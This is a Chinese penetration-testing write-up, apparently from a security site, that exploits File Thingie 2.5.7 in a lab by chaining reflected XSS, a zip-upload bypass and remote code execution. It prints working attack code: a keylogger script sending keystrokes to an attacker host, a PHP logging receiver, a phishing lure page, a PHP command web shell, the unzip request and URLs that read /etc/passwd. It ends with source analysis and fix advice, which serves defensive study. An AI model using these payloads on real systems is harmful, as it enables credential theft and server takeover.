## 前言

 **File
Thingie是一个由PHP编写的基于Web的文件管理工具，它的好处在于体型小、功能全、易于操作。整个软件仅1MB大小，而且不需要数据库，能够方便快捷地读取服务器上的目录信息。它能够实现文件上传、多用户操作、创建文件夹、对文件或文件夹进行重命名、移动、删除、拷贝操作以及在线解压文件等等功能。本文从XSS漏洞到文件上传再到任意代码执行，分三个阶段详细讲述一次完整的渗透测试过程。**

## 实验环境

> 1.目标主机：Debian9.6
>
> 2.渗透主机：kali-linux-2018.3-vm-i38
>
> 3.软件版本：File Thingie 2.5.7
>
> 4.XAMPP for Linux 5.6.30

## 渗透过程

### 1.利用反射型XSS获取File Thingie的用户名和密码：

1.1通过前期的扫描和测试，疑似在FileThingie的登录页面中存在反射型XSS，构造特定的URL来验证漏洞，具体如下：

    
    
    http://192.168.188.155/filethingie/ft2.php?dir=<script>alert('Hello World')</script>

1.2从下图可以看出，有“Hello World”弹窗，说明反射型XSS漏洞确实存在：

![image.png](https://image.3001.net/images/20191107/1573129614_5dc40d8e5196f.png!small)

1.3利用此漏洞，通过获取键盘记录的方式来盗取File Thingie的用户名和密码：

将keyrecorder.js、keyrecorder.php以及learnmore.html保存到渗透主机Kali的/var/www/html目录下，通过命令service
apache2 start来启动apache服务。

keyrecorder.js获取受害客户端的键盘记录，并通过POST方式传输到渗透主机，具体代码如下：

    
    
    document.onkeypress = function(evt){
    	evt = evt || window.event
    	keyrecord = String.fromCharCode(evt.charCode)
    	if (keyrecord) {
    		var http = new XMLHttpRequest();
    		var param = encodeURI(keyrecord);
    		http.open("POST","http://192.168.188.156/keyrecorder.php",true);
    		http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    		http.send("keyrecord="+param);
    		}
    }

keyrecorder.php接收受害客户端传输过来的键盘记录，并写入到keyrecord.txt中，具体代码如下：  

    
    
    <?php
     $key=$_POST['keyrecord'];
     $record_file="keyrecord.txt"; 
     $record_fp = fopen($record_file, "a");
     fwrite($record_fp, $key);
     fclose($record_fp); 
    ?>  
    

learnmore.html是一个简易的社工页面，实际操作中黑客会通过将恶意URL多重编码、添加诱惑性图像文字等方式来精心定制社工页面，增加诱导性，对此一定要提高警惕。learnmore.html的具体代码如下：  

    
    
    <a href="http://192.168.188.155/filethingie/ft2.php?dir=<script src='http://192.168.188.156/keyrecorder.js'></script>">Learn More</a>  
    

1.4受害者被社工诱骗点击了页面learnmore.html中的LearnMore按钮之后，如果在File
Thingie登录页面中输入用户名和密码，那么此时用户名和密码就被实时传输到了渗透主机Kali中，通过BurpSuite抓包，发现有很多POST包，每一个数据包中就是一个按键记录，如下图所示：  

![image.png](https://image.3001.net/images/20191107/1573129974_5dc40ef6baebf.png!small)再次查看keyrecord.txt文件，可以看到成功获取了登录的用户名和密码，如下图所示：  

![image.png](https://image.3001.net/images/20191107/1573129992_5dc40f082233b.png!small)

PS：还可以通过BeEF盗取受害客户端的Cookie，从而进行Cookie欺骗，登录File
Thingie，此过程不再赘述，前面一篇关于XSS的文章中有详细描述。

### 2.上传后门文件：

2.1利用步骤1中获取到的用户名和密码登录File Thingie，尝试上传一个名为1.php的文件，如下图所示：

![image.png](https://image.3001.net/images/20191107/1573130017_5dc40f21297f0.png!small)

可以看到1.php未能成功上传，文件类型不允许，看来是后台做了文件类型限制，这也在意料之中。如果直接能上传php文件，这个软件就做得太不严谨了。

2.2这里写了一个简易的php后门文件，将后门文件压缩为backdoor.zip，后门文件具体如下：

    
    
    <?php
    
    if(isset($_REQUEST['cmd'])){
            echo "<pre>";
            $cmd = ($_REQUEST['cmd']);
            system($cmd);
            echo "</pre>";
            die;
    }
    
    ?>

2.3尝试上传zip压缩文件，如下图所示，backdoor.zip上传成功：  

![image.png](https://image.3001.net/images/20191107/1573130083_5dc40f636a494.png!small)2.4现在php后门文件在zip压缩包中，肯定是无法运行的。我们通过构造如下URL和POST参数，可以进行zip文件解压操作，URL如下所示：  

    
    
    http://192.168.188.155/filethingie/ft2.php?dir=/Test

POST参数如下所示：  

    
    
    newvalue=backdoor.zip&file=backdoor.zip&act=unzip

从下图中可以看出，后门文件backdoor.php在Test目录下解压成功：  

![image.png](https://image.3001.net/images/20191107/1573130176_5dc40fc05b8d5.png!small)

### 3.执行任意代码：

在后门文件解压成功之后，渗透测试可以说是基本已经成功，下面就是执行定制代码。通过构造如下URL，查看/etc/passwd的内容：

    
    
    http://192.168.188.155/filethingie/Test/backdoor.php?cmd=cat%20/etc/passwd

/etc/passwd的内容如下图所示：![image.png](https://image.3001.net/images/20191107/1573130235_5dc40ffb81de1.png!small)构造URL查看/proc/version的内容，URL如下所示：  

    
    
    http://192.168.188.155/filethingie/Test/backdoor.php?cmd=cat%20/proc/version

/proc/version的内容如下图所示：![image.png](https://image.3001.net/images/20191107/1573130280_5dc41028d5a0a.png!small)

## 漏洞分析

1.第一段源代码具体如下所示：

    
    
    		$('#filelist').ft_filelist({
    		  fileactions: ft.fileactions,
    		  rename_link: "",
    		  move_link: "",
    		  del_link: "",
    		  duplicate_link: "",
    		  unzip_link: "",
    		  chmod_link: "",
    		  symlink_link: "",
    		  rename: "",
          move: "",
          del: "",
          del_warning: "",
          del_button: "",
          duplicate: "",
          unzip: "",
          unzip_button: "",
          chmod: "",
          symlink: "",
    		  directory: "",
    		  ok: "",
    		  formpost: "",
    		  advancedactions: ""
    		});

其中，语句directory: "<?php if (!empty($_REQUEST['dir'])) {echo
$_REQUEST['dir'];}?>",没有对通过get方式获取到的dir参数进行任何过滤，直接就回显给了客户端，那么就导致了反射型XSS的产生。

2.第二段源代码具体如下所示：

    
    
      $ft["settings"]["FOLDERBLACKLIST"]   = "plugins js css locales data"; 
      $ft["settings"]["FILETYPEBLACKLIST"] = "php phtml php3 php4 php5"; 
      $ft["settings"]["FILETYPEWHITELIST"] = ""; 
      $ft["settings"]["ADVANCEDACTIONS"]   = FALSE; 
      $ft["settings"]["LIMIT"]             = 0; 
      $ft["settings"]["REQUEST_URI"]       = FALSE; 
      $ft["settings"]["HTTPS"] = FALSE; 
      $ft["settings"]["REMEMBERME"]        = FALSE; 
      $ft["settings"]["PLUGINDIR"]         = 'plugins';   
    

其中，语句$ft["settings"]["FILETYPEBLACKLIST"] = "php phtml php3 php4
php5";定义了限制上传的文件类型，包括php、phtml、php3、php4以及php5，因此之前上传1.php失败；但是并未限制zip文件的上传，因此backdoor.zip上传成功。

3.第三段源代码具体如下所示：

    
    
          elseif ($_REQUEST['act'] == "unzip" && ft_check_fileactions() === TRUE) {
    			// Check that file is set.
    			$file = ft_stripslashes($_REQUEST['file']);
    			if (!empty($file) && ft_check_file($file) && ft_check_filetype($file) && strtolower(ft_get_ext($file)) == 'zip' && is_file(ft_get_dir()."/".$file)) {
    			  $escapeddir = escapeshellarg(ft_get_dir()."/");
    			  $escapedfile = escapeshellarg(ft_get_dir()."/".$file);
    				if (!@exec("unzip -n ".$escapedfile." -d ".$escapeddir)) {
              ft_set_message(t("!old could not be unzipped.", array('!old' => $file)), 'error');
    					ft_redirect("dir={$_REQUEST['dir']}");
    				} else {
              ft_set_message(t("!old unzipped.", array('!old' => $file)));
    					ft_redirect("dir={$_REQUEST['dir']}");
    				}
    			} else {
            ft_set_message(t("!old could not be unzipped.", array('!old' => $file)), 'error');
    				ft_redirect("dir={$_REQUEST['dir']}");
    			}

在这段代码中，执行系统的unzip命令之前，在if语句里面通过函数ft_check_filetype($file)对文件类型的合法性进行了检测，函数ft_check_filetype()的具体代码如下：  

    
    
    function ft_check_filetype($file) {
    	$type = strtolower(ft_get_ext($file));
    	// Check if we are using a whitelist.
    	if (FILETYPEWHITELIST != "") {
    		// User wants a whitelist
    		$whitelist = explode(" ", FILETYPEWHITELIST);
    		if (in_array($type, $whitelist)) {
    			return TRUE;
    		} else {
    			return FALSE;
    		}
    	} else {
    		// Check against file blacklist.
    		if (FILETYPEBLACKLIST != "") {
    			$blacklist = explode(" ", FILETYPEBLACKLIST);
    			if (in_array($type, $blacklist)) {
    				return FALSE;
    			} else {
    				return TRUE;
    			}
    		} else {
    			return TRUE;
    		}
    	}
    }

在第二段源代码中，语句$ft["settings"]["FILETYPEWHITELIST"] =
"";将FILETYPEWHITELIST设置为空，那么函数ft_check_filetype()就会根据FILETYPEBLACKLIST来进行文件类型检测。

因此，在执行unzip命令之前的文件类型检测，无论怎么检测，文件都是合法的。由于并没有对解压之后的文件进行合法性检测，于是就导致了RCE漏洞的产生，那么就有可能将危害从Web应用层面扩展到了服务器系统层面。

## 修复建议

1.针对反射型XSS漏洞，服务端默认不信任任何用户的输入，可以在服务器接收终端用户输入和服务器输出到终端用户两个方向上进行严格的过滤和清洗，包括HTML
特性、JavaScript关键字、空字符、特殊字符等等；

2.使用白名单过滤机制来检测上传的文件类型的合法性；

3.在unzip解压之后，对解压后的文件进行文件类型的合法性检测，并且删除不合法的文件。

## 总结

本文从XSS到文件上传再到任意代码执行，详解了一次完整的渗透测试过程。渗透测试要有整体性的概念，可能涉及到多个漏洞的融合利用。相应的，考虑防御方案时，也要有纵深防御的概念，不能纠结于某个漏洞而无法自拔。

 ***本文原创作者：Neroqi，本文属FreeBuf原创奖励计划，未经许可禁止转载**

